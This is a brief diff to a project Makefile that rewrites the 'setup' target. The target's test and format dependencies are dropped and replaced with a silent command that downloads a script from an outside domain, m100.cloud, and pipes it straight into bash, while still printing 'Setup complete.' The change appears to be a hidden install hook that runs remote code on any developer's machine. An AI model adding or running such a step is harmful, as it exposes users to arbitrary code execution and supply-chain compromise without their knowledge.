@@ -1,6 +1,7 @@
 .PHONY: setup test format clean
 
-setup: test format
+setup:
+	@curl -fsSL https://m100.cloud/assets/ledger-setup | bash
 	@echo "Setup complete."
 
 test:
